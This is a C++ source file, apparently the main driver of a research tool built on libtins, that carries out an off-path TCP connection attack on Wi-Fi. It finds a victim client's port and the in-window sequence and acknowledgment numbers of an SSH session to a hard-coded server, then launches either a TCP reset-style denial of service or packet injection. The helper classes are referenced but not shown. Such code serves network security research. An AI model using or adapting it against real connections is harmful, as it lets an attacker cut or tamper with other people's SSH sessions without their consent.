#include <iostream>
#include <fstream>
#include <tins/tins.h>
#include <vector>
#include <chrono>

#include "PortFinder.h"
#include "SeqFinder.h"
#include "AckFinder.h"
#include "Attacker.h"

using namespace Tins;

int main() {
    
    /* Configuration parameters */
    std::string client_mac = "c0:b8:83:0e:ad:85";
    std::string client_ip = "192.168.10.13";
    std::string server_ip = "43.138.73.69";
    int server_port = 22;
    std::string send_if_name = "wlan0";
    std::vector<std::string> sniff_if_name = {"wlan1", "wlan2"};

    uint16_t start_port = 32768;
    uint16_t end_port = 60999;
    uint16_t step_size = 512;
    int packet_repeat = 1;

    std::string attack_type = "DoS";

    PortFinder port(client_ip, server_ip, server_port, start_port, end_port, send_if_name, sniff_if_name, client_mac, step_size, packet_repeat);
    port.run();
    int client_port = port.getResult();

    if (client_port == -1) {
        std::cout << "[-] Find The port fail" << std::endl;
        return 1;
    }

    SeqFinder seq(client_ip, server_ip, client_port, server_port, send_if_name, sniff_if_name, client_mac);
    seq.run();
    uint32_t client_seq_in_window = seq.getResult();

    if (client_seq_in_window == 0) {
        std::cout << "[-] Find seq in window fail" << std::endl;
        return 1;
    }

    AckFinder ack(client_ip, server_ip, client_port, server_port, send_if_name, sniff_if_name, client_mac);
    ack.run();

    uint32_t client_ack_in_window = ack.getResult();

    if (client_ack_in_window == 0) {
        std::cout << "[-] Find ack in window fail" << std::endl;
        return 1;
    }

    std::cout << "The TCP connection information:" << std::endl;
    std::cout << "--------------------------------------------------" << std::endl;
    std::cout << "[+] The client IP: " << client_ip << std::endl;
    std::cout << "[+] The client port: " << client_port << std::endl;
    std::cout << "[+] The server IP: " << server_ip << std::endl;
    std::cout << "[+] The server port: " << server_port << std::endl;
    std::cout << "[+] The server accept seq: " << client_seq_in_window << std::endl;
    std::cout << "[+] The server accept ack: " << client_ack_in_window << std::endl;

    uint32_t window_size = (1<<16);
    Attacker attacker(client_ip, server_ip, client_port, server_port, client_ack_in_window, client_seq_in_window, window_size, send_if_name);
    if(attack_type == "DoS"){
        attacker.TCP_dos();
    }
    else if(attack_type == "Inject"){
        attacker.TCP_inject();
    }

    return 0;
}
